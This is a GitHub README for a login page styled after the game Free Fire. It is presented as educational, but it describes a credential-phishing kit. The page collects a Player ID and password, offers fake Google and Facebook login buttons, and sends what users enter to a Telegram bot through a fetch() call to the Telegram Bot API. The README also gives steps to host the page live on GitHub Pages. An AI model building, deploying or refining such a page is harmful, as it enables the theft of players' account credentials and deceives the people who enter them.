# 🔥 Free Fire Style Login Page

This is a **fictitious login page inspired by Free Fire** game design, made for **educational purposes only**.  
Users can enter a Player ID and Password, then simulate login using Google or Facebook buttons.

The login data is sent to a **Telegram Bot** via the Bot API — perfect to learn about web forms, HTML/CSS/JS, and Telegram integration.

---

## 🎯 Features

- 🔐 Input fields: Player ID + Password  
- 🧠 Fake login buttons (Google, Facebook)  
- ⚙️ Telegram Bot integration (send info)  
- 🎮 Gaming UI inspired by Free Fire

---

## 🚀 Live Demo (after GitHub Pages is enabled)

> https://your-username.github.io/freefire-login-site/

*(replace `FF-LOgin` with your GitHub username)*

---

## 🔧 How It Works

1. User fills in Player ID and Password
2. On click, data is sent using:
   ```js
   fetch(`https://api.telegram.org/botYOUR_TOKEN/sendMessage?...`)
